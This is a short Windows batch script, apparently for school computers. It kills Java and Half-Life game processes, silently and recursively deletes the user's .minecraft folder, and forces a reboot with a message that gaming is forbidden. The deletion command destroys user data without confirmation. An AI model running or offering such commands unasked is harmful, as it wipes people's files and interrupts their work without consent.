@echo off
taskkill /f /im javaw.exe
taskkill /f /im hl.exe
taskkill /f /im hl2.exe
cd %USERPROFILE%/AppData/Roaming
del /s /q ".minecraft"
shutdown /r /t 5 /c "Playing games on school computers is forbidden."